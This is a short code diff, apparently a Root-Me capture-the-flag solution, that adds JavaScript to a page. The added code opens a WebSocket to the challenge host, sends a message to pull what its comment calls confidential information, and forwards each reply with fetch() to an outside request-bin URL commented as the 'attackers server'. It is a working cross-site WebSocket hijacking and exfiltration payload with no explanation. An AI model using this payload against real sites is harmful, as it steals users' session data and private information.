@@ -15,6 +15,16 @@
 			  which: 13,
 			  keyCode: 13,
 			});
+        var ws = new WebSocket('ws://ctf20.root-me.org/ws');
+	ws.onopen = start
+	ws.onmessage = handleReply
+	function start(event) {
+	  ws.send('hello'); //Send the message to retreive confidential information
+	}
+	function handleReply(event) {
+	  //Exfiltrate the confidential information to attackers server
+	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
+	}
         document.getElementById('input').value='hello';
 	    document.getElementById('input').dispatchEvent(event);
 
